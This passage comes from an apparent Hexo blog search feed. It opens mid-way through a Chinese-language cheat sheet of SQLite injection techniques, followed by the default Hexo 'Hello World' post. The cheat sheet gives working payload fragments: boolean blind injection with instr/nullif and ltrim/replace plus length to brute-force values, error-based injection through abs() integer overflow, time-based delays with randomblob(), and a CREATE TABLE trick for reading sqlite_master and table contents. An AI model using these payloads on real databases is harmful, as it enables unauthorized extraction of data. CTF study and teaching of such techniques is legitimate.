?</p><pre class=" language-cookie"><code class="language-cookie">select 'abc' GLOb 'a*'; 'abc' GLOb 'a*'---------------1          </code></pre><h4 id="nullif-和-instr"><a href="#nullif-和-instr" class="headerlink" title="nullif 和 instr()"></a>nullif 和 instr()</h4><p>instr(a,b) 返回 b第一次出现在a的地方 ，</p><p>和<code>nullif()</code>一起用 如果是出现在<code>1</code>就返回null</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','z'),1); //0 </code></pre><p>如果没有匹配到会返回<code>0</code>,这就和null一样效果</p><p>为了防止这种情况，在后面加上 <code>||1</code> 拼接字符串</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','b'),1)||1; // 21select nullif(instr('abca','a'),1)||1;  //nullselect nullif(instr('abca','ab'),1)||1; //null</code></pre><h4 id="利用-ltrim-和length-注入"><a href="#利用-ltrim-和length-注入" class="headerlink" title="利用 ltrim() 和length() 注入"></a>利用 ltrim() 和length() 注入</h4><p>使用<code>length()</code>获取字段的长度</p><pre class=" language-cookie"><code class="language-cookie">select length("vote")=4;</code></pre><pre class=" language-cookie"><code class="language-cookie">sqlite> select length(ltrim("vote","vo"))=2;</code></pre><p>然后<code>ltrim()</code> 函数从左往右爆破字符串，</p><p>如果爆破的字符串正确，那么length就会减少</p><h4 id="同理-rtrim-trim-和-length"><a href="#同理-rtrim-trim-和-length" class="headerlink" title="同理 rtrim()/trim()和 length()"></a>同理 rtrim()/trim()和 length()</h4><h4 id="replace-和length-注入"><a href="#replace-和length-注入" class="headerlink" title="replace()和length()注入"></a>replace()和length()注入</h4><p>最好前面有标识符号，<code>flag{</code> 这样<br>和 ltrim 和 rtrim类似<br>不然麻烦</p><pre class=" language-cookie"><code class="language-cookie">select  length(replace('flag{aza}','flag{a',''))=3;//1 select length(replace('flag{aza}','flag{b',''))=3;//0</code></pre><h4 id="ltrim-和-length-和nullif"><a href="#ltrim-和-length-和nullif" class="headerlink" title="ltrim() 和 length()和nullif()"></a>ltrim() 和 length()和nullif()</h4><pre class=" language-cookie"><code class="language-cookie">select nullif(length(ltrim("vote","vo")),2);</code></pre><p>nullif 和 length 和ltrim 配合</p><p>如果 正确返回<code>null</code></p><h4 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a>case when then else end</h4><pre class=" language-cookie"><code class="language-cookie">select CASE  WHEN  1=1 THEN 1 ELSE 0 END ;//1select CASE  WHEN  1=2 THEN 1 ELSE 0 END ; //0</code></pre><h4 id="利用abs-报错，ifnull-nullif"><a href="#利用abs-报错，ifnull-nullif" class="headerlink" title="利用abs()报错，ifnull(),nullif()"></a>利用abs()报错，ifnull(),nullif()</h4><ul><li><p>ifnull可以用<code>coalesce()</code>函数代替</p></li><li><p><code>abs()</code>函数存在整形溢出</p></li><li><p>当abs()参数是<code>-9223372036854775808</code>也就是<code>0x8000000000000000</code><br>就会报错</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select abs(0x99999999999999999);Error: hex literal too big: 0x99999999999999999</code></pre><p>所以基于报错的注入：</p></li></ul><p>通过nullif和ifnull来决定是否报错<br>如果 <code>1=1</code> 就报错</p><pre class=" language-cookie"><code class="language-cookie">select abs(ifnull(nullif(1,1),0x8000000000000000));Error: integer overflowselect abs(ifnull(nullif(1,2),0x8000000000000000));2</code></pre><h3 id="时间盲注-randomblob"><a href="#时间盲注-randomblob" class="headerlink" title="时间盲注 randomblob()"></a>时间盲注 randomblob()</h3><p>randomblob(n)可以产生n长度的字符串，足够长就可以延时</p><pre class=" language-cookie"><code class="language-cookie">select case when substr('abc',1,1)='a' then randomblob(1000000) else 0 end;</code></pre><h3 id="CREATE注入"><a href="#CREATE注入" class="headerlink" title="CREATE注入"></a>CREATE注入</h3><p>语句 :</p><pre><code>create table [xx] as select</code></pre><pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><p>这样就是 <code>(123</code> 为列名， type 默认是 TEXT</p><p>创造一个表 <code>aa</code> ，</p><p>数据是从 <code>sec_tb</code> 的 <code>a1</code>列 复制过去的数据</p><p><strong>获取表:</strong></p><pre><code>CREATE TABLE [cc] as select [sql][(123] from sqlite_master ;</code></pre><p><strong>获取数据</strong></p><pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/02/10/hello-world/"/>
      <url>/2020/02/10/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p>##写文章</p><pre><code>---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><pre class=" language-$xslt"><code class="language-$xslt">title    Markdown 的文件标题    文章标题，强烈建议填写此选项date    文件创建时的日期时间    发布时间，强烈建议填写此选项，且最好保证全局唯一author    根 _config.yml 中的 author    文章作者img    featureImages 中的某个值    文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpgtop    true    推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章cover    false    v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中coverImg    无    v1.0.2版本新增，表示该文章在首页轮播封面需**要显示的图片路径，如果没有，则默认使用文章的特色图片password    无    文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项toc    true    是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项mathjax    false    是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行summary    无    文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories    无    文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类tags    无    文章标签，一篇文章可以多个标签</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
